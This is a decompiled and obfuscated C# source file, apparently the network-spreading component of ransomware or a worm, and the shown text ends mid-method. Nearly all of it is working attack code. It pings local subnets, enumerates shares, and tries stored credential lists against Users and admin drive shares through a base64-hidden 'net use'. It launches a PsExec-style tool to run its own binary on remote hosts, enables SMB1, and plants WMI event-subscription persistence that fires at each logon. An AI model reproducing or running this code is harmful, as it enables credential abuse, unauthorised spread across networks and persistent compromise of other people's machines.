using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PbjBzLsVOvNrzQ;

internal class XrKkNyLTzbCIc
{
	public class lYbuxLxdQnNT
	{
		public string GIVzQksruvQT { get; set; }
	}

	public enum cUVekauZmDexbEk
	{
		eOOYkJznDIoFrO = 1,
		PTnFbsaYzEjCX,
		slYFnznZXvz,
		PucSGLPuWbl,
		rbqbaftDspFo
	}

	public enum bxtOdwloPlQN
	{
		GXCeiPvCGnb,
		GspeFJkKeNv,
		HgMASIvIgYPmFz,
		nSAkumWnbTkLoaS
	}

	public enum JqGFNIcJOW
	{
		TWPxgNeKQLWqF = 1,
		EspqHKGIyRSTEsH = 2,
		mwGWEaidfmQc = 4,
		xdzyljpfRGhMGU = 8,
		ieImnEQkkqkpIBV = 16,
		LpeXmgKvOzXy = 19
	}

	public enum ehLMakXkQcdhO
	{
		yavzGhTPEb,
		lshRQPqKHJo,
		utPlIkwYeKvplSnijt,
		EtoaaSCyGQQK,
		UHvZVVyRXeTL,
		WTAeRweUdgTLgJg,
		ifbWBVDTxiRZZI,
		SWbIZEFhuxHz,
		QXwOoUMOefUfiS,
		gXZjkRktdKFX,
		rhhZNCwlpPSd,
		CXOcLsbRbPVMxw
	}

	public class WLvBDzzHiRWo : IEnumerable
	{
		private enum yBiVslfVnVW
		{
			mlwZUAePwl = 0,
			lvKiATdhizA = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private class biygQhmuVkhxcY
		{
			public cUVekauZmDexbEk hXjPeftnJIX;

			public bxtOdwloPlQN JzZNuVKPzrHF;

			public ehLMakXkQcdhO PEegwHPTvJHd;

			public JqGFNIcJOW gJCPOgXsCZZsn;

			public string VXZHpUdHYIwmK;

			public string eAyNriqjpPF;

			public string YJJTaoauRzfXvR;

			public string iQCiSxFXlE;
		}

		private ArrayList JnxOVzNjkPqVMAc = new ArrayList();

		public int YSwVIQUUdBsP => JnxOVzNjkPqVMAc.Count;

		[DllImport("Mpr.dll")]
		private static extern yBiVslfVnVW WNetOpenEnumA(cUVekauZmDexbEk dwScope, bxtOdwloPlQN dwType, JqGFNIcJOW dwUsage, biygQhmuVkhxcY p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern yBiVslfVnVW WNetCloseEnum(IntPtr hEnum);

		[DllImport("Mpr.dll")]
		private static extern yBiVslfVnVW WNetEnumResourceA(IntPtr hEnum, ref uint lpcCount, IntPtr buffer, ref uint lpBufferSize);

		private void EnumerateServers(biygQhmuVkhxcY pRsrc, cUVekauZmDexbEk scope, bxtOdwloPlQN type, JqGFNIcJOW usage, ehLMakXkQcdhO displayType)
		{
			uint lpBufferSize = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint lpcCount = 1u;
			if (WNetOpenEnumA(scope, type, usage, pRsrc, out lphEnum) == yBiVslfVnVW.mlwZUAePwl)
			{
				yBiVslfVnVW yBiVslfVnVW;
				do
				{
					yBiVslfVnVW = WNetEnumResourceA(lphEnum, ref lpcCount, intPtr, ref lpBufferSize);
					switch (yBiVslfVnVW)
					{
					case yBiVslfVnVW.lvKiATdhizA:
						continue;
					case yBiVslfVnVW.mlwZUAePwl:
						Marshal.PtrToStructure(intPtr, pRsrc);
						if (pRsrc.PEegwHPTvJHd == displayType)
						{
							JnxOVzNjkPqVMAc.Add(pRsrc.eAyNriqjpPF);
						}
						if ((pRsrc.gJCPOgXsCZZsn & JqGFNIcJOW.EspqHKGIyRSTEsH) == JqGFNIcJOW.EspqHKGIyRSTEsH)
						{
							EnumerateServers(pRsrc, scope, type, usage, displayType);
						}
						continue;
					}
					break;
				}
				while (yBiVslfVnVW != yBiVslfVnVW.lvKiATdhizA);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public WLvBDzzHiRWo(cUVekauZmDexbEk scope, bxtOdwloPlQN type, JqGFNIcJOW usage, ehLMakXkQcdhO displayType)
		{
			biygQhmuVkhxcY pRsrc = new biygQhmuVkhxcY();
			EnumerateServers(pRsrc, scope, type, usage, displayType);
		}

		public IEnumerator GetEnumerator()
		{
			return JnxOVzNjkPqVMAc.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct sWdeRLxORVMP
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string yzchzGvHHxaudWG;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string qGkTBuepZaK;

		public uint YduYxQewWHi;

		public uint trOTGoGDRWeL;

		public IntPtr LPeVFwGcGXmzF;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct asHipOfQUUaTVpPd
	{
		public int YduYxQewWHi;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string UbmnfpiIVxz;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string gNpfTYoUuoVMOd;
	}

	public struct pnSlARpagU
	{
		public string lSvSAaMCVPoQ;

		public string[] MJTlKzGuqqoM;

		public pnSlARpagU(string Name, string[] Target)
		{
			lSvSAaMCVPoQ = Name;
			MJTlKzGuqqoM = Target;
		}
	}

	[CompilerGenerated]
	private sealed class AckhEebafYFP
	{
		private sealed class UXhmvXLhoMJt
		{
			public AckhEebafYFP ZHrwEvTtfM;

			public int uMVferEtpjjGwsRu;

			public void _003Cscanner_003Eb__4(int g)
			{
				oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("bmV0LmV4ZQ=="), string.Concat("use \\\\", ZHrwEvTtfM.MYYUFfdxpfrd, "\\", (char)g, "$ /USER:", bAYVukBQXPziyfQ[uMVferEtpjjGwsRu], " ", doAEIyHAiHMl[uMVferEtpjjGwsRu]));
				Thread.Sleep(oIxRFVSIpmRuMqIJ.ZtHZstDoJGDmq);
				oIxRFVSIpmRuMqIJ.MKUZKBzhhik(string.Concat("\\\\", ZHrwEvTtfM.MYYUFfdxpfrd, "\\", (char)g, "$"));
			}
		}

		public Ping SECVRmkVpxI;

		public PingReply EoQGABMOuzgMj;

		public IPAddress MYYUFfdxpfrd;

		public string fncWpgajHpw;

		public void _003Cscanner_003Eb__2(int i)
		{
			try
			{
				string text = "." + i;
				SECVRmkVpxI = new Ping();
				EoQGABMOuzgMj = SECVRmkVpxI.Send(fncWpgajHpw + text, 900);
				if (EoQGABMOuzgMj.Status != 0)
				{
					return;
				}
				try
				{
					MYYUFfdxpfrd = IPAddress.Parse(fncWpgajHpw + text);
					IPHostEntry hostEntry = Dns.GetHostEntry(MYYUFfdxpfrd);
					if (oIxRFVSIpmRuMqIJ.xdynXtEYQwd.Contains(string.Concat("\\\\", MYYUFfdxpfrd, "\\Users")) || hostEntry.HostName.Contains(Environment.MachineName))
					{
						return;
					}
					oIxRFVSIpmRuMqIJ.SyqwnpfhIlEpjOk.Add(MYYUFfdxpfrd.ToString());
					try
					{
						if (oIxRFVSIpmRuMqIJ.AoHprIWbHuW == "YES")
						{
							Parallel.For(0, bAYVukBQXPziyfQ.Count, delegate(int f)
							{
								oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("bmV0LmV4ZQ=="), string.Concat("use \\\\", MYYUFfdxpfrd, "\\Users /USER:", bAYVukBQXPziyfQ[f], " ", doAEIyHAiHMl[f]));
								Thread.Sleep(oIxRFVSIpmRuMqIJ.ZtHZstDoJGDmq);
								oIxRFVSIpmRuMqIJ.MKUZKBzhhik(string.Concat("\\\\", MYYUFfdxpfrd, "\\Users"));
								Parallel.For(65, 91, delegate(int g)
								{
									oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("bmV0LmV4ZQ=="), string.Concat("use \\\\", MYYUFfdxpfrd, "\\", (char)g, "$ /USER:", bAYVukBQXPziyfQ[f], " ", doAEIyHAiHMl[f]));
									Thread.Sleep(oIxRFVSIpmRuMqIJ.ZtHZstDoJGDmq);
									oIxRFVSIpmRuMqIJ.MKUZKBzhhik(string.Concat("\\\\", MYYUFfdxpfrd, "\\", (char)g, "$"));
								});
							});
						}
						else
						{
							oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("bmV0LmV4ZQ=="), string.Concat("use \\\\", MYYUFfdxpfrd, "\\Users"));
							Thread.Sleep(oIxRFVSIpmRuMqIJ.ZtHZstDoJGDmq);
							oIxRFVSIpmRuMqIJ.MKUZKBzhhik(string.Concat("\\\\", MYYUFfdxpfrd, "\\Users"));
							Parallel.For(65, 91, delegate(int g)
							{
								oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("bmV0LmV4ZQ=="), string.Concat("use \\\\", MYYUFfdxpfrd, "\\", (char)g, "$"));
								Thread.Sleep(oIxRFVSIpmRuMqIJ.ZtHZstDoJGDmq);
								oIxRFVSIpmRuMqIJ.MKUZKBzhhik(string.Concat("\\\\", MYYUFfdxpfrd, "\\", (char)g, "$"));
							});
						}
					}
					catch
					{
					}
				}
				catch
				{
				}
			}
			catch (Exception)
			{
			}
		}

		public void _003Cscanner_003Eb__3(int f)
		{
			oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("bmV0LmV4ZQ=="), string.Concat("use \\\\", MYYUFfdxpfrd, "\\Users /USER:", bAYVukBQXPziyfQ[f], " ", doAEIyHAiHMl[f]));
			Thread.Sleep(oIxRFVSIpmRuMqIJ.ZtHZstDoJGDmq);
			oIxRFVSIpmRuMqIJ.MKUZKBzhhik(string.Concat("\\\\", MYYUFfdxpfrd, "\\Users"));
			Parallel.For(65, 91, delegate(int g)
			{
				oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("bmV0LmV4ZQ=="), string.Concat("use \\\\", MYYUFfdxpfrd, "\\", (char)g, "$ /USER:", bAYVukBQXPziyfQ[f], " ", doAEIyHAiHMl[f]));
				Thread.Sleep(oIxRFVSIpmRuMqIJ.ZtHZstDoJGDmq);
				oIxRFVSIpmRuMqIJ.MKUZKBzhhik(string.Concat("\\\\", MYYUFfdxpfrd, "\\", (char)g, "$"));
			});
		}

		public void _003Cscanner_003Eb__5(int g)
		{
			oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("bmV0LmV4ZQ=="), string.Concat("use \\\\", MYYUFfdxpfrd, "\\", (char)g, "$"));
			Thread.Sleep(oIxRFVSIpmRuMqIJ.ZtHZstDoJGDmq);
			oIxRFVSIpmRuMqIJ.MKUZKBzhhik(string.Concat("\\\\", MYYUFfdxpfrd, "\\", (char)g, "$"));
		}
	}

	[CompilerGenerated]
	private sealed class DNcYYDkGdVPd
	{
		public string vigEXCsRSgXxsa;

		public string whwJHkxdxASLk;

		public void _003CRun_003Eb__d(string ip)
		{
			if ((!ip.StartsWith("10.") && !ip.StartsWith("172.") && !ip.StartsWith("192.168.") && !ip.Contains("")) || !RnLJgPsOlWsH(ip))
			{
				return;
			}
			if (oIxRFVSIpmRuMqIJ.AoHprIWbHuW == "YES")
			{
				for (int i = 0; i < bAYVukBQXPziyfQ.Count; i++)
				{
					if (oIxRFVSIpmRuMqIJ.scKRevUuzGg)
					{
						if (File.Exists(vigEXCsRSgXxsa))
						{
							oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(vigEXCsRSgXxsa, "\\\\" + ip + " -u \"" + bAYVukBQXPziyfQ[i] + "\" -p \"" + doAEIyHAiHMl[i] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(whwJHkxdxASLk))
					{
						oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(whwJHkxdxASLk, "\\\\" + ip + " -u \"" + bAYVukBQXPziyfQ[i] + "\" -p \"" + doAEIyHAiHMl[i] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			}
			else if (oIxRFVSIpmRuMqIJ.scKRevUuzGg)
			{
				if (File.Exists(vigEXCsRSgXxsa))
				{
					oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(vigEXCsRSgXxsa, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
				}
			}
			else if (File.Exists(whwJHkxdxASLk))
			{
				oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(whwJHkxdxASLk, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
			}
		}
	}

	[CompilerGenerated]
	private sealed class qqBUDnsGqYMQsjQ
	{
		public string zTCszjXeoCs;

		public bool _003CGetIPAddresses_003Eb__11(string o)
		{
			return o != zTCszjXeoCs;
		}
	}

	private const int JEgaHrzsSnXKYz = 268435455;

	private const int uoHEjlupYjGfefy = 0;

	public static List<string> TheQVmJakgX = new List<string>();

	public static string IYBpkoeWfrimKriwW = "";

	public static List<string> bAYVukBQXPziyfQ = new List<string>();

	public static List<string> doAEIyHAiHMl = new List<string>();

	public static List<string> hbmOkASbzwlZH = new List<string>();

	public List<string> AjylsGXmxjKHJ = new List<string>();

	public List<string> znXxHPCxfLJXxA = new List<string>();

	public List<string> hTZnwJmvxryqp = new List<string>();

	public static void IIPocyWIdFz()
	{
		XrKkNyLTzbCIc xrKkNyLTzbCIc = UgwyZQuUiXHSPY();
		Parallel.ForEach(xrKkNyLTzbCIc.hTZnwJmvxryqp, delegate(string SzAWvDxsRGpL)
		{
			string text = SzAWvDxsRGpL.Split(new char[1] { '.' })[0] + "." + SzAWvDxsRGpL.Split(new char[1] { '.' })[1] + "." + SzAWvDxsRGpL.Split(new char[1] { '.' })[2];
			if (text.StartsWith("10.") || text.StartsWith("172.") || text.StartsWith("192.168.") || text.StartsWith(""))
			{
				atpVvmspiyMbp(text);
			}
		});
	}

	public static void atpVvmspiyMbp(string xOCJFLaYllX)
	{
		Ping SECVRmkVpxI;
		PingReply EoQGABMOuzgMj;
		IPAddress MYYUFfdxpfrd;
		Parallel.For(0, 255, delegate(int i)
		{
			try
			{
				string text = "." + i;
				SECVRmkVpxI = new Ping();
				EoQGABMOuzgMj = SECVRmkVpxI.Send(xOCJFLaYllX + text, 900);
				if (EoQGABMOuzgMj.Status == IPStatus.Success)
				{
					try
					{
						MYYUFfdxpfrd = IPAddress.Parse(xOCJFLaYllX + text);
						IPHostEntry hostEntry = Dns.GetHostEntry(MYYUFfdxpfrd);
						if (!oIxRFVSIpmRuMqIJ.xdynXtEYQwd.Contains(string.Concat("\\\\", MYYUFfdxpfrd, "\\Users")) && !hostEntry.HostName.Contains(Environment.MachineName))
						{
							oIxRFVSIpmRuMqIJ.SyqwnpfhIlEpjOk.Add(MYYUFfdxpfrd.ToString());
							try
							{
								if (oIxRFVSIpmRuMqIJ.AoHprIWbHuW == "YES")
								{
									Parallel.For(0, bAYVukBQXPziyfQ.Count, delegate(int f)
									{
										oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("bmV0LmV4ZQ=="), string.Concat("use \\\\", MYYUFfdxpfrd, "\\Users /USER:", bAYVukBQXPziyfQ[f], " ", doAEIyHAiHMl[f]));
										Thread.Sleep(oIxRFVSIpmRuMqIJ.ZtHZstDoJGDmq);
										oIxRFVSIpmRuMqIJ.MKUZKBzhhik(string.Concat("\\\\", MYYUFfdxpfrd, "\\Users"));
										Parallel.For(65, 91, delegate(int g)
										{
											oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("bmV0LmV4ZQ=="), string.Concat("use \\\\", MYYUFfdxpfrd, "\\", (char)g, "$ /USER:", bAYVukBQXPziyfQ[f], " ", doAEIyHAiHMl[f]));
											Thread.Sleep(oIxRFVSIpmRuMqIJ.ZtHZstDoJGDmq);
											oIxRFVSIpmRuMqIJ.MKUZKBzhhik(string.Concat("\\\\", MYYUFfdxpfrd, "\\", (char)g, "$"));
										});
									});
								}
								else
								{
									oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("bmV0LmV4ZQ=="), string.Concat("use \\\\", MYYUFfdxpfrd, "\\Users"));
									Thread.Sleep(oIxRFVSIpmRuMqIJ.ZtHZstDoJGDmq);
									oIxRFVSIpmRuMqIJ.MKUZKBzhhik(string.Concat("\\\\", MYYUFfdxpfrd, "\\Users"));
									Parallel.For(65, 91, delegate(int g)
									{
										oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("bmV0LmV4ZQ=="), string.Concat("use \\\\", MYYUFfdxpfrd, "\\", (char)g, "$"));
										Thread.Sleep(oIxRFVSIpmRuMqIJ.ZtHZstDoJGDmq);
										oIxRFVSIpmRuMqIJ.MKUZKBzhhik(string.Concat("\\\\", MYYUFfdxpfrd, "\\", (char)g, "$"));
									});
								}
								return;
							}
							catch
							{
								return;
							}
						}
						return;
					}
					catch
					{
						return;
					}
				}
			}
			catch (Exception)
			{
			}
		});
	}

	public static XrKkNyLTzbCIc UgwyZQuUiXHSPY()
	{
		new List<List<string>>();
		new List<string>();
		new List<string>();
		new List<string>();
		XrKkNyLTzbCIc xrKkNyLTzbCIc = new XrKkNyLTzbCIc();
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		NetworkInterface[] array = allNetworkInterfaces;
		foreach (NetworkInterface networkInterface in array)
		{
			if (networkInterface.OperationalStatus != OperationalStatus.Up)
			{
				continue;
			}
			try
			{
				networkInterface.GetIPProperties();
				foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
				{
					if (unicastAddress.Address.AddressFamily != AddressFamily.InterNetwork)
					{
						continue;
					}
					IPAddress address = unicastAddress.Address;
					IPAddress iPv4Mask = unicastAddress.IPv4Mask;
					byte[] addressBytes = address.GetAddressBytes();
					byte[] addressBytes2 = iPv4Mask.GetAddressBytes();
					if (addressBytes.Length == addressBytes2.Length)
					{
						byte[] array2 = new byte[addressBytes.Length];
						for (int j = 0; j < array2.Length; j++)
						{
							array2[j] = (byte)(addressBytes[j] | (addressBytes2[j] ^ 0xFFu));
						}
						IPAddress iPAddress = new IPAddress(array2);
						byte[] array3 = new byte[addressBytes.Length];
						for (int k = 0; k < array3.Length; k++)
						{
							array3[k] = (byte)(addressBytes[k] & addressBytes2[k]);
						}
						IPAddress iPAddress2 = new IPAddress(array3);
						xrKkNyLTzbCIc.znXxHPCxfLJXxA.Add(networkInterface.Name);
						xrKkNyLTzbCIc.hTZnwJmvxryqp.Add(iPAddress2.ToString());
						xrKkNyLTzbCIc.AjylsGXmxjKHJ.Add(iPAddress.ToString());
					}
				}
			}
			catch (Exception)
			{
			}
		}
		return xrKkNyLTzbCIc;
	}

	public static List<lYbuxLxdQnNT> JPrzYQbeVZbw()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c net view";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<lYbuxLxdQnNT> list = new List<lYbuxLxdQnNT>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == "There are no entries in the list.")
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new lYbuxLxdQnNT
						{
							GIVzQksruvQT = string.Concat("\\", stringBuilder, "\\Users")
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string GPSspOCLvmPUMp, int AUvijSoaiSqTNl, int DkXTxUdyDqLTLa, out IntPtr KNDhABwBUxycOZ, [MarshalAs(UnmanagedType.I4)] out int pggNIWcfGylAQU, [MarshalAs(UnmanagedType.I4)] ref int cAmLeavgPohtQNb);

	public static List<pnSlARpagU> VeOIEztIdBBCEVV(string sytFeGFiLUhsbDVMw)
	{
		try
		{
			List<pnSlARpagU> list = new List<pnSlARpagU>();
			IntPtr KNDhABwBUxycOZ = default(IntPtr);
			int pggNIWcfGylAQU = 0;
			int cAmLeavgPohtQNb = 0;
			if (NetDfsEnum(sytFeGFiLUhsbDVMw, 3, 268435455, out KNDhABwBUxycOZ, out pggNIWcfGylAQU, ref cAmLeavgPohtQNb) == 0)
			{
				for (int i = 0; i < pggNIWcfGylAQU; i++)
				{
					sWdeRLxORVMP sWdeRLxORVMP = (sWdeRLxORVMP)Marshal.PtrToStructure(KNDhABwBUxycOZ + i * Marshal.SizeOf(typeof(sWdeRLxORVMP)), typeof(sWdeRLxORVMP));
					if (sWdeRLxORVMP.yzchzGvHHxaudWG == sytFeGFiLUhsbDVMw)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < sWdeRLxORVMP.trOTGoGDRWeL; j++)
					{
						IntPtr ptr = new IntPtr(sWdeRLxORVMP.LPeVFwGcGXmzF.ToInt64() + j * Marshal.SizeOf(typeof(asHipOfQUUaTVpPd)));
						asHipOfQUUaTVpPd asHipOfQUUaTVpPd = (asHipOfQUUaTVpPd)Marshal.PtrToStructure(ptr, typeof(asHipOfQUUaTVpPd));
						if (asHipOfQUUaTVpPd.YduYxQewWHi == 2)
						{
							list2.Add(Path.Combine(new string[3] { "\\\\", asHipOfQUUaTVpPd.UbmnfpiIVxz, asHipOfQUUaTVpPd.gNpfTYoUuoVMOd }));
						}
					}
					string text = sWdeRLxORVMP.yzchzGvHHxaudWG.Replace(sytFeGFiLUhsbDVMw, "");
					if (text.StartsWith("\\"))
					{
						text = text.Substring(1);
					}
					list.Add(new pnSlARpagU(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void DIQHHLxSHJDburo()
	{
		oIxRFVSIpmRuMqIJ.vvpYtdlvuXBO("Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol");
		List<lYbuxLxdQnNT> list = JPrzYQbeVZbw();
		List<pnSlARpagU> list2 = VeOIEztIdBBCEVV(Environment.MachineName);
		if (list2 != null)
		{
			foreach (pnSlARpagU item in list2)
			{
				string[] mJTlKzGuqqoM = item.MJTlKzGuqqoM;
				foreach (string text in mJTlKzGuqqoM)
				{
					if (text.Contains(Environment.MachineName) || !string.IsNullOrEmpty(text))
					{
						continue;
					}
					try
					{
						if (oIxRFVSIpmRuMqIJ.AoHprIWbHuW == "YES")
						{
							for (int j = 0; j < bAYVukBQXPziyfQ.Count; j++)
							{
								oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("bmV0LmV4ZQ=="), "use " + text + " /USER:" + bAYVukBQXPziyfQ[j] + " " + doAEIyHAiHMl[j]);
								Thread.Sleep(oIxRFVSIpmRuMqIJ.ZtHZstDoJGDmq);
								oIxRFVSIpmRuMqIJ.MKUZKBzhhik(text);
							}
						}
						else
						{
							oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("bmV0LmV4ZQ=="), "use " + text);
							Thread.Sleep(oIxRFVSIpmRuMqIJ.ZtHZstDoJGDmq);
							oIxRFVSIpmRuMqIJ.MKUZKBzhhik(text);
						}
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (lYbuxLxdQnNT item2 in list)
		{
			if (item2.GIVzQksruvQT.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (oIxRFVSIpmRuMqIJ.AoHprIWbHuW == "YES")
				{
					for (int k = 0; k < bAYVukBQXPziyfQ.Count; k++)
					{
						oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("bmV0LmV4ZQ=="), "use " + item2.GIVzQksruvQT + " /USER:" + bAYVukBQXPziyfQ[k] + " " + doAEIyHAiHMl[k]);
						Thread.Sleep(oIxRFVSIpmRuMqIJ.ZtHZstDoJGDmq);
						oIxRFVSIpmRuMqIJ.MKUZKBzhhik(item2.GIVzQksruvQT);
					}
				}
				else
				{
					oIxRFVSIpmRuMqIJ.beVAbavcTbJwdi(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("bmV0LmV4ZQ=="), "use " + item2.GIVzQksruvQT);
					Thread.Sleep(oIxRFVSIpmRuMqIJ.ZtHZstDoJGDmq);
					oIxRFVSIpmRuMqIJ.MKUZKBzhhik(item2.GIVzQksruvQT);
				}
			}
			catch
			{
			}
		}
	}

	public static void TGehsRmJgHPvMJ(string vFxIqLpkkshbK, string rcxflPkFWSY, string IYRPXXspUHkZuQc)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0164: Expected O, but got Unknown
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = "\\\\" + vFxIqLpkkshbK + "\\root\\subscription";
			ConnectionOptions val = new ConnectionOptions();
			ManagementScope val2 = null;
			val2 = new ManagementScope(text, val);
			val2.get_Options().set_Username(rcxflPkFWSY);
			val2.get_Options().set_Password(IYRPXXspUHkZuQc);
			val2.get_Options().set_Authority(string.Format("ntlmdomain:{0}", "."));
			val2.get_Options().set_EnablePrivileges(true);
			val2.get_Options().set_Authentication((AuthenticationLevel)6);
			val2.get_Options().set_Impersonation((ImpersonationLevel)3);
			val2.Connect();
			ManagementClass val3 = new ManagementClass(val2, new ManagementPath("__EventFilter"), (ObjectGetOptions)null);
			string text2 = "SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'";
			WqlEventQuery val4 = new WqlEventQuery(text2);
			ManagementObject val5 = val3.CreateInstance();
			((ManagementBaseObject)val5).set_Item("Name", (object)"WorkerFilter");
			((ManagementBaseObject)val5).set_Item("Query", (object)((ManagementQuery)val4).get_QueryString());
			((ManagementBaseObject)val5).set_Item("QueryLanguage", (object)((ManagementQuery)val4).get_QueryLanguage());
			((ManagementBaseObject)val5).set_Item("EventNameSpace", (object)"root\\cimv2");
			val5.Put();
			ManagementObject val6 = new ManagementClass(val2, new ManagementPath("CommandLineEventConsumer"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val6).set_Item("Name", (object)"EventConsumer");
			((ManagementBaseObject)val6).set_Item("ExecutablePath", (object)("\\\\" + vFxIqLpkkshbK + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)));
			val6.Put();
			ManagementObject val7 = new ManagementClass(val2, new ManagementPath("__FilterToConsumerBinding"), (ObjectGetOptions)null).CreateInstance();
			((ManagementBaseObject)val7).set_Item("Filter", (object)val5.get_Path().get_RelativePath());
			((ManagementBaseObject)val7).set_Item("Consumer", (object)val6.get_Path().get_RelativePath());
			val7.Put();
		}
		catch (Exception)
		{
		}
	}

	public static void GiBSicHYPn()
	{
		oIxRFVSIpmRuMqIJ.medQfEsbBgN();
		List<TuaugdeAQAcO> list = TuaugdeAQAcO.MDDWbyxZUMiY();
		foreach (TuaugdeAQAcO item in list)
		{
			TheQVmJakgX.Add(item.UqULQkNkqbpV);
		}
		if (oIxRFVSIpmRuMqIJ.SyqwnpfhIlEpjOk.Count > 0)
		{
			TheQVmJakgX = TheQVmJakgX.Union(oIxRFVSIpmRuMqIJ.SyqwnpfhIlEpjOk).ToList();
		}
		string vigEXCsRSgXxsa = "";
		string whwJHkxdxASLk = "";
		try
		{
			vigEXCsRSgXxsa = WJVrKGeOBqjbua();
		}
		catch
		{
		}
		try
		{
			whwJHkxdxASLk = LygqiSoKBpPQN();
		}
		catch
		{
		}
		foreach (TuaugdeAQAcO item2 in list)
		{
			try
			{
				if (item2.UqULQkNkqbpV.StartsWith("10.") || item2.UqULQkNkqbpV.StartsWith("172.") || item2.UqULQkNkqbpV.StartsWith("192.168.") || item2.UqULQkNkqbpV.Contains(""))
				{
					yPqGNCHRyu.uEJodmVTcBURWJA(item2.qJCUfkkRoCoLs, item2.UqULQkNkqbpV, "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(TheQVmJakgX, delegate(string ip)
			{
